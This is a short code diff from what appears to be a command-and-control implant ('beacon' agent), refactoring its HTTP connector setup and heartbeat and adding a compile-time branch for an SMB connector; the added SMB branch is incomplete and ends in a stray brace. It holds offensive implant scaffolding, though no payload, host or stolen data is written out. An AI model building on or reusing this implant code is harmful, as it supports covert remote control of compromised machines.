@@ -5,7 +5,11 @@
 #include "Crypt.h"
 #include "WaitMask.h"
 
-Agent*         g_Agent;
+Agent* g_Agent;
+
+#if defined(BEACON_HTTP)
+
+#include "ConnectorHTTP.h"
 ConnectorHTTP* g_Connector;
 
 void AgentMain()
@@ -18,14 +22,16 @@ void AgentMain()
 
 	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
 	*g_Connector = ConnectorHTTP();
-	g_Connector->SetConfig( g_Agent->config->profile, g_Agent->BuildBeat() );
+
+	ULONG beatSize = 0;
+	BYTE* beat = g_Agent->BuildBeat(&beatSize);
+
+	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
+		return;
 
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
 	packerOut->Pack32(0);
-
-	ULONG recvDataSize = 0;
-	BYTE* recvData     = NULL;
 
 	do {
 		if (packerOut->datasize() > 4) {
@@ -67,6 +73,18 @@ void AgentMain()
 	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
 }
+
+
+
+#elif defined(BEACON_SMB)
+
+#include "ConnectorSMB.h"
+ConnectorSMB* g_Connector;
+
+}
+#endif
+
+
 
 void AgentClear(int method)
 {
